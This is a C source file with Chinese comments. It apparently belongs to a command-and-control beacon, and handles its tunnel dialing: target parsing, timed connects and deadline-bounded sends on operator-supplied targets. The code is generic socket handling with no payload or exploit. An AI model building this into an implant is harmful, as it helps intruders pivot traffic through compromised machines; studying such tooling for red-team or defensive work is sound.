/*
 * tunnel_client.c - 隧道主动拨号与套接字发送
 *
 * 把目标地址字符串解析为可连接的套接字，并提供阻塞式全量发送。
 * 这里只做网络 I/O，不涉及通道生命周期或线程管理。
 */
#include "beacon_tunnel_internal.h"

/* 将目标字符串拆分为主机和服务（端口）组件 */
static INT TunnelSplitTarget(const CHAR* target, CHAR* host, SIZE_T host_len, CHAR* service, SIZE_T service_len)
{
    const CHAR* colon;
    const CHAR* svc;
    SIZE_T len;
    SIZE_T svc_len;

    if (!target || !target[0]) {
        return 0;
    }

    /* 处理 IPv6 方括号表示法 [host]:port */
    if (target[0] == '[') {
        const CHAR* end = strchr(target, ']');
        if (!end || end[1] != ':') {
            return 0;
        }
        len = (SIZE_T)(end - target - 1);
        svc = end + 2;
        /* 显式边界检查：target 来自控制端，strcpy_s 超限会触发 CRT fail-fast */
        if (len + 1 > host_len) {
            return 0;
        }
        svc_len = strlen(svc);
        if (svc_len == 0 || svc_len + 1 > service_len) {
            return 0;
        }
        memcpy(host, target + 1, len);
        host[len] = 0;
        memcpy(service, svc, svc_len + 1);
        return 1;
    }

    /* 处理 host:port 表示法 */
    colon = strrchr(target, ':');
    if (!colon || colon == target || colon[1] == 0) {
        return 0;
    }
    len = (SIZE_T)(colon - target);
    svc = colon + 1;
    if (len + 1 > host_len) {
        return 0;
    }
    svc_len = strlen(svc);
    if (svc_len + 1 > service_len) {
        return 0;
    }
    memcpy(host, target, len);
    host[len] = 0;
    memcpy(service, svc, svc_len + 1);
    return 1;
}

INT TunnelTestSplitTarget(const CHAR* target, CHAR* host, SIZE_T host_len,
                          CHAR* service, SIZE_T service_len)
{
    return TunnelSplitTarget(target, host, host_len, service, service_len);
}

/* 使用非阻塞套接字和 select() 进行带超时的连接 */
static INT TunnelConnectWithTimeout(SOCKET s, const struct sockaddr* addr, INT addr_len, INT timeout_ms)
{
    u_long nonblock = 1;
    u_long blocking = 0;
    INT ret;
    fd_set write_set;
    fd_set except_set;
    TIMEVAL tv;
    INT so_error = 0;
    INT so_len = sizeof(so_error);

    /* 开始非阻塞连接 */
    ioctlsocket(s, FIONBIO, &nonblock);
    ret = connect(s, addr, addr_len);
    if (ret == 0) {
        ioctlsocket(s, FIONBIO, &blocking);
        return 0;
    }

    /* 检查预期的进行中错误 */
    ret = WSAGetLastError();
    if (ret != WSAEWOULDBLOCK && ret != WSAEINPROGRESS && ret != WSAEINVAL) {
        return ret;
    }

    /* 等待连接完成或超时 */
    FD_ZERO(&write_set);
    FD_ZERO(&except_set);
    FD_SET(s, &write_set);
    FD_SET(s, &except_set);
    tv.tv_sec = timeout_ms / 1000;
    tv.tv_usec = (timeout_ms % 1000) * 1000;
    ret = select(0, NULL, &write_set, &except_set, &tv);
    if (ret == 0) {
        return WSAETIMEDOUT;
    }
    if (ret == SOCKET_ERROR) {
        return WSAGetLastError();
    }

    /* select 后检查套接字错误 */
    if (getsockopt(s, SOL_SOCKET, SO_ERROR, (CHAR*)&so_error, &so_len) == SOCKET_ERROR) {
        return WSAGetLastError();
    }
    if (so_error != 0) {
        return so_error;
    }

    /* 恢复阻塞模式 */
    ioctlsocket(s, FIONBIO, &blocking);
    return 0;
}

/* 解析并连接到目标地址，返回已连接的套接字 */
SOCKET TunnelDialTarget(const TunnelStartRequest* req, INT* reason)
{
    CHAR host[256];
    CHAR service[32];
    ADDRINFOA hints;
    ADDRINFOA* result = NULL;
    ADDRINFOA* ai;
    INT gai;
    SOCKET connected = INVALID_SOCKET;
    INT last_error = WSAECONNREFUSED;

    *reason = TUNNEL_REASON_UNKNOWN;

    /* 将目标解析为主机和服务 */
    if (!TunnelSplitTarget(req->target, host, sizeof(host), service, sizeof(service))) {
        *reason = TUNNEL_REASON_DNS_FAILED;
        return INVALID_SOCKET;
    }

    /* 设置 DNS 解析的地址提示 */
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = strcmp(req->proto, "udp") == 0 ? SOCK_DGRAM : SOCK_STREAM;
    hints.ai_protocol = strcmp(req->proto, "udp") == 0 ? IPPROTO_UDP : IPPROTO_TCP;

    gai = getaddrinfo(host, service, &hints, &result);
    if (gai != 0) {
        *reason = TUNNEL_REASON_DNS_FAILED;
        return INVALID_SOCKET;
    }

    /* 尝试每个解析的地址 */
    for (ai = result; ai; ai = ai->ai_next) {
        SOCKET s = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
        if (s == INVALID_SOCKET) {
            last_error = WSAGetLastError();
            continue;
        }
        if (strcmp(req->proto, "udp") == 0) {
            /* UDP：简单阻塞连接 */
            if (connect(s, ai->ai_addr, (INT)ai->ai_addrlen) == 0) {
                connected = s;
                break;
            }
            last_error = WSAGetLastError();
        } else {
            /* TCP：带超时的连接 */
            last_error = TunnelConnectWithTimeout(s, ai->ai_addr, (INT)ai->ai_addrlen, req->connect_timeout_ms);
            if (last_error == 0) {
                connected = s;
                break;
            }
        }
        closesocket(s);
    }
    freeaddrinfo(result);

    if (connected == INVALID_SOCKET) {
        *reason = TunnelWsaReason(last_error);
    } else {
        *reason = TUNNEL_REASON_NONE;
    }
    return connected;
}

/* 下行发送默认 deadline（ms）：防止零窗口/半开连接把主循环卡在 send 上分钟级 */
#define TUNNEL_SEND_DEADLINE_MS (30 * 1000)

/*
 * 在套接字上发送全部数据；成功返回 1，超时或错误返回 0。
 *
 * 该函数在主循环线程上执行（TunnelHandleData 转发下行数据），因此不能用
 * 阻塞式 send：目标零窗口或半开连接时会无限期冻结整个 beacon 心跳。实现为
 * 非阻塞分段发送 + select 等待可写，总时长受 TUNNEL_SEND_DEADLINE_MS 约束；
 * 单片等待上限 10s，超时即放弃并让上层走 close 流程。
 */
INT TunnelSendAll(SOCKET s, const BYTE8* data, SIZE_T len)
{
    u_long nonblock = 1;
    u_long blocking = 0;
    SIZE_T sent_total = 0;
    ULONGLONG deadline = GetTickCount64() + TUNNEL_SEND_DEADLINE_MS;

    if (s == INVALID_SOCKET || (!data && len > 0)) {
        return 0;
    }

    ioctlsocket(s, FIONBIO, &nonblock);

    while (sent_total < len) {
        fd_set write_set;
        TIMEVAL tv;
        DWORD wait_ms;
        INT n;

        /* 整体 deadline 检查：剩余预算决定单片 select 等待时长（≤10s） */
        ULONGLONG now = GetTickCount64();
        if (now >= deadline) {
            ioctlsocket(s, FIONBIO, &blocking);
            return 0;
        }
        wait_ms = (DWORD)(deadline - now);
        if (wait_ms > 10 * 1000) {
            wait_ms = 10 * 1000;
        }

        FD_ZERO(&write_set);
        FD_SET(s, &write_set);
        tv.tv_sec = wait_ms / 1000;
        tv.tv_usec = (wait_ms % 1000) * 1000;
        if (select(0, NULL, &write_set, NULL, &tv) <= 0) {
            continue; /* 超时/错误：回到循环头检查总体 deadline */
        }

        n = send(s, (const CHAR*)data + sent_total,
                 (INT)((len - sent_total) > 32768 ? 32768 : (len - sent_total)), 0);
        if (n == SOCKET_ERROR || n == 0) {
            INT err = WSAGetLastError();
            if (n == SOCKET_ERROR && err == WSAEWOULDBLOCK) {
                continue; /* 窗口暂满，等下一轮 select */
            }
            ioctlsocket(s, FIONBIO, &blocking);
            return 0;
        }
        sent_total += (SIZE_T)n;
    }

    ioctlsocket(s, FIONBIO, &blocking);
    return 1;
}
